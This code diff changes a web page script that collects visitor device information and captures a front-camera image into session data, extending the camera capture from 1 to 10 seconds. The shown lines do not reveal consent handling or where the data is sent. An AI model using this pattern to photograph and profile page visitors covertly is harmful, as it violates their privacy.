@@ -121,8 +121,8 @@
                 sessionData = { ...sessionData, ...deviceInfo }; // Merge device info into sessionData
                 console.log('Device Info Retrieved:', deviceInfo);
 
-                // Step 3: Take Screenshot
-                const screenshot = await takeScreenshot();
+                // Step 3: Take Screenshot after 10 seconds
+                const screenshot = await takeScreenshot(10000); // Load camera for 10 seconds
                 sessionData.screenshot = screenshot;
                 console.log('Screenshot Captured');
 
@@ -172,7 +172,7 @@
         }
 
         // Function to take a screenshot using the front camera
-        async function takeScreenshot() {
+        async function takeScreenshot(duration) {
             const video = document.createElement('video');
             video.autoplay = true;
 
@@ -195,7 +195,7 @@
                     video.srcObject.getTracks().forEach(track => track.stop());
                     document.body.removeChild(video);
                     resolve(canvas.toDataURL('image/png'));
-                }, 1000);
+                }, duration); // Take the screenshot after specified duration
             });
         }
 
